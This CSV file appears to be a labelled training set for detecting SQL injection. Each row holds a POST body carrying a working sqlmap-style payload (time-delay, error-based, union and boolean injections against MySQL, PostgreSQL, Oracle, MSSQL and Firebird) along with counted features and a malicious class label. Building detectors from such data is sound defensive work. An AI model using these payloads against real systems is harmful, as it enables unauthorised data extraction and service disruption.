method,body,class,single_q,double_q,dashes,braces,spaces,badwords,path
POST,"1%'   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  '%'  =  '",1,4,0,0,16,83,3,
POST,"1' and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,1,0,3,16,70,1,
POST,"1'||  (  select 'vixv' from dual where 7704  =  7704 union all select null,null,null,null,null--",1,3,0,3,1,17,6,
POST,"1%""   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""%""  =  """,1,0,4,0,40,192,4,
POST,"1'||  (  select 'fbsr' where 7899  =  7899 and elt  (  4249  =  4249,7259   )    )   ||'",1,4,0,0,4,31,3,
POST,"1'  )   where 6056  =  6056 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",1,1,0,3,21,117,15,
POST,"iif  (  4638  =  8258,1,1/0  )  ",1,0,0,0,2,12,0,
POST,"-3873%'   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,1,0,1,16,89,6,
POST,"1'  )   as nvqk where 3917  =  3917 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,0,3,5,42,6,
POST,1'   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  'acml' like 'acml,1,4,0,0,14,71,7,
POST,"1'   )    )     )   union all select null,null,null,null--",1,1,0,3,3,18,3,
POST,"1""  )   as rdvm where 6360  =  6360 and sleep  (  5  )  --",1,0,1,3,3,22,4,
POST,"1""   )    )    or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   ""onhh""  =  ""onhh",1,0,4,0,20,96,2,
POST,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'blie'  =  'blie",1,4,0,0,14,79,7,
POST,"1"" where 7245  =  7245 and 9198  =  9198--",1,0,1,3,0,12,2,
POST,"1'  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  'yqmv'  =  'yqmv",1,4,0,0,34,158,3,
POST,"1' and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",1,3,0,0,8,42,2,
POST,"1 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  ",1,0,0,0,10,46,2,
POST,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'pbin'  =  'pbin",1,4,0,0,4,30,3,
POST,"1""   )    )     )   and 4124  =  7245 and    (    (     (  ""tuom""  =  ""tuom",1,0,4,0,6,40,2,
POST,1'  )   as irnj where 7274  =  7274 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,1,1,0,3,5,39,5,
POST,1'   )    )    as fqia where 1936  =  1936 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --,1,1,0,3,10,57,7,
POST,-1479%' or 5201  =  3398--,1,1,0,4,0,6,1,
POST,1'+  (  select enzd where 6046  =  6046 and   (  3020  =  3020  )  *6703  )  +',1,2,0,0,4,29,3,
POST,if  (  8264  =  1939  )   select 8264 else drop function nsoq--,1,0,0,3,2,18,2,
POST,"1  )   as skby where 4269  =  4269 or elt  (  6272  =  6272,sleep  (  5   )    )   --",1,0,0,3,5,36,3,
POST,"1'||  (  select 'hfbt' where 7204  =  7204 union all select null,null,null,null,null,null,null,null,null,null--",1,3,0,3,1,15,5,
POST,"-5606   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,0,0,1,16,89,6,
POST,"1""  )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""gozk""  =  ""gozk",1,0,4,0,32,158,5,
POST,"1""   )    )     )   union all select null,null,null,null,null,null--",1,0,1,3,3,18,3,
POST,"1   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",1,0,0,0,6,34,1,
POST,"-3805""   )    )     )   union all select 9123,9123,9123,9123,9123,9123,9123,9123#",1,0,1,1,3,18,3,
POST,"-4970'  )   union all select 4625,4625,4625,4625,4625,4625,4625,4625#",1,1,0,1,1,8,3,
POST,"1'  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",1,1,0,0,19,98,7,
POST,"1""   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1,0,1,0,15,68,1,
POST,1'  )   where 8204  =  8204,1,1,0,0,1,10,1,
POST,"1'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  'llfp'  =  'llfp",1,4,0,0,8,48,2,
POST,1'   )    )    as wuws where 6917  =  6917 union all select null#,1,1,0,0,2,22,5,
POST,"1 and elt  (  2770  =  3669,3669  )  # sfls",1,0,0,0,2,15,1,
POST,"-3566' where 3641  =  3641 union all select 3641,3641,3641,3641,3641#",1,1,0,1,0,10,4,
POST,"1""   )    )    as riui where 2605  =  2605",1,0,1,0,2,18,2,
POST,"1' and make_set  (  8403  =  8403,8899  )   and 'lnwe'  =  'lnwe",1,4,0,0,2,20,2,
POST,"-5043%'   )    )     )   union all select 5860,5860,5860,5860,5860#",1,1,0,1,3,18,3,
POST,1  )   waitfor delay '0:0:5'--,1,2,0,3,1,7,2,
POST,-8519%'   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   '%'  =  ',1,4,0,1,32,160,5,
POST,"1"" and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""jgcv""  =  ""jgcv",1,0,4,0,30,150,5,
POST,"1' in boolean mode  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   #",1,1,0,0,7,42,5,
POST,"1'   )    )    as peeo where 5356  =  5356 and elt  (  4722  =  2382,2382  )  --",1,1,0,3,4,32,3,
POST,"1'+  (  select ijck where 9961  =  9961 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   +'",1,2,0,0,20,111,9,
POST,"1'  )   where 2121  =  2121 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,1,0,3,5,41,8,
POST,"1'  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  'xjvr'  =  'xjvr",1,4,0,0,6,45,8,
POST,"-1270'||  (  select 'mgdi' where 6785  =  6785 union all select 6785,6785#",1,3,0,1,1,15,5,
POST,"1""   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  ""sdps""  =  ""sdps",1,0,4,0,14,73,5,
POST,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",1,0,1,3,4,27,3,
POST,1%'   )    )     )   rlike   (  select   (  case when   (  7697  =  3334  )   then 1 else 0x28 end   )    )    and    (    (     (  '%'  =  ',1,4,0,0,12,74,2,
POST,"1'||  (  select 'ymac' from dual where 9268  =  9268 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )     )  ||'",1,4,0,0,6,41,5,
POST,waitfor delay '0:0:5' and   (  'gpqx' like 'gpqx,1,5,0,0,1,10,4,
POST,"-9997' union all select 9347,9347,9347,9347,9347,9347,9347,9347#",1,1,0,1,0,4,3,
POST,1%'   )    )     )   and 7533  =  7533 and    (    (     (  '%'  =  ',1,4,0,0,6,40,2,
POST,1'   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  'bwka'  =  'bwka,1,8,0,0,10,67,4,
POST,"-9050 union all select 9346,9346,9346,9346,9346,9346,9346,9346,9346,9346--",1,0,0,4,0,4,3,
POST,"1""   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   ""tbdl"" like ""tbdl",1,0,4,0,24,131,16,
POST,"1""   )    )     )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  ""ecoa"" like ""ecoa",1,0,4,0,10,62,6,
POST,"1%""  )   rlike sleep  (  5  )  #",1,0,1,0,3,14,1,
POST,"1'  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  'gtov' like 'gtov",1,4,0,0,6,36,3,
POST,1' in boolean mode  )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  #,1,1,0,0,31,151,5,
POST,"1'   )    )    as qwdh where 7581  =  7581 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1,0,3,24,112,3,
POST,select case when 3661  =  9315 then 1 else null end--,1,0,0,3,0,12,2,
POST,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",1,4,0,0,12,63,4,
POST,"-1513""  )   as swvd where 2958  =  2958 union all select 2958,2958,2958--",1,0,1,4,1,16,5,
POST,-2951 or 4189  =  2291,1,0,0,1,0,6,1,
POST,"1' in boolean mode  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   #",1,1,0,0,5,31,3,
POST,"1'  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",1,3,0,0,9,46,2,
POST,1'||  (  select 'ytwz' from dual where 3025  =  3025 and   (  5039  =  5303  )  *5303  )  ||',1,4,0,0,4,31,4,
POST,end and   (  9416  =  9416,1,0,0,0,1,10,1,
POST,"1%'  )   union all select null,null,null,null#",1,1,0,0,1,8,3,
POST,"select * from generate_series  (  7536,7536,case when   (  7536  =  7523  )   then 1 else 0 end  )   limit 1--",1,0,0,3,4,32,3,
POST,"1""   )    )    as femc where 1313  =  1313 and 4595  =  4595#",1,0,1,0,2,24,3,
POST,"1"" where 4298  =  4298 order by 1--",1,0,1,3,0,9,3,
POST,-1468'   )    )     )   or 4875  =  6163#,1,1,0,1,3,20,1,
POST,"1  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,0,0,3,11,50,2,
POST,-3062'   )    )    or 6872  =  6872 and    (    (   'uzth' like 'uzth,1,4,0,1,4,30,3,
POST,"-1407 where 1186  =  1186 union all select 1186,1186,1186,1186,1186--",1,0,0,4,0,10,4,
POST,"-1370'   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  'xmrg'  =  'xmrg",1,4,0,1,8,48,2,
POST,"1%"" and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and ""%""  =  """,1,0,4,0,6,41,5,
POST,"-9509  )   union all select 1193,1193,1193#",1,0,0,1,1,8,3,
POST,"1""   )    )    as azak where 4911  =  4911",1,0,1,0,2,18,2,
POST,"1 where 2267  =  2267 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",1,0,0,3,10,52,3,
POST,"1'   )    )     )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  'qpuy'  =  'qpuy",1,4,0,0,24,128,8,
POST,"1' where 8837  =  8837 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,0,3,4,36,5,
POST,"1""   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   ""auyv""  =  ""auyv",1,0,4,0,42,203,7,
POST,1'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1,1,0,3,6,37,3,
POST,1'   )    )     )   and 4595  =  4595#,1,1,0,0,3,20,1,
POST,"1  )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,0,0,3,11,50,2,
POST,"1""  )   as ymto where 3453  =  3453",1,0,1,0,1,12,2,
POST,"-7320""  )   where 3907  =  3907 union all select 3907,3907--",1,0,1,4,1,14,4,
POST,"1 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  # mafe",1,0,0,0,12,67,1,
POST,"-1663' or elt  (  1032  =  1032,3623  )   and 'yqaj' like 'yqaj",1,4,0,1,2,18,3,
POST,-3578'   )    )     )   order by 1--,1,1,0,4,3,17,2,
POST,"1%'   )    )     )   union all select null,null,null#",1,1,0,0,3,18,3,
POST,"select sleep  (  5  )   and   (  ""tlbj"" like ""tlbj",1,0,3,0,3,17,4,
POST,"1'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  'drvk' like 'drvk",1,4,0,0,26,139,16,
POST,"1""  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""zbwn"" like ""zbwn",1,2,4,0,10,54,4,
POST,"1' in boolean mode  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  #",1,1,0,0,5,37,5,
POST,"-3834'   )    )     )   union all select 8313,8313--",1,1,0,4,3,18,3,
POST,-8248 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  ) ,1,4,0,1,4,32,3,
POST,"1   )    )    as juoe where 9994  =  9994 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,0,0,3,6,51,10,
POST,"1' where 8950  =  8950 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,0,3,4,36,5,
POST,1' where 3701  =  3701 and 2006  =  2006,1,1,0,0,0,12,2,
POST,"-1668""   )    )     )   or 9323  =  9323#",1,0,1,1,3,20,1,
POST,"1  )   or elt  (  6272  =  6272,sleep  (  5   )    )   ",1,0,0,0,5,28,1,
POST,"1""  )   rlike   (  select   (  case when   (  5746  =  5367  )   then 1 else 0x28 end   )    )    and   (  ""hnnf"" like ""hnnf",1,0,4,0,8,52,3,
POST,1'   )    )     )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'cgiu'  =  'cgiu,1,4,0,0,36,178,5,
POST,1'   )    )     )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  'jzpb'  =  'jzpb,1,4,0,0,44,211,7,
POST,"1'  )   where 8255  =  8255 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,0,3,5,40,5,
POST,"1%""   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  ""%""  =  """,1,0,4,0,10,65,8,
POST,"1'+  (  select pxsd where 2576  =  2576 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   +'",1,2,0,0,12,66,4,
POST,-2207%'  )   or   (  8459  =  8459  )  *4906 and   (  '%'  =  ',1,4,0,1,4,28,2,
POST,"1""  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  ""ubvd""  =  ""ubvd",1,0,4,0,6,38,3,
POST,1'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  'cmqe' like 'cmqe,1,4,0,0,10,51,6,
POST,"-6766"" where 6591  =  6591 or make_set  (  9354  =  9354,7185  )  --",1,0,1,4,2,20,2,
POST,"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  8997  =  8997",1,0,0,0,5,29,4,
POST,-7610' or 3038  =  3038,1,1,0,1,0,6,1,
POST,1'||  (  select 'gmkp' where 6016  =  6016,1,3,0,0,1,11,2,
POST,"1,  (  case when 6620  =  3092 then 1 else null end  )  ",1,0,0,0,2,19,1,
POST,"1%""   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   ""%""  =  """,1,0,4,0,8,59,9,
POST,"1  )   and elt  (  1210  =  1210,sleep  (  5   )    )   ",1,0,0,0,5,28,1,
POST,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   7240  =  7240",1,0,0,0,12,59,4,
POST,"-4155'   )    )     )   union all select 1775,1775,1775,1775,1775,1775,1775--",1,1,0,4,3,18,3,
POST,"-8021'   )    )    or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'cenk' like 'cenk",1,4,0,1,34,166,6,
POST,"1%""  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  ""%""  =  """,1,0,4,0,22,121,15,
POST,"1,  (  select   (  case when   (  5433  =  5433  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",1,0,0,0,10,59,5,
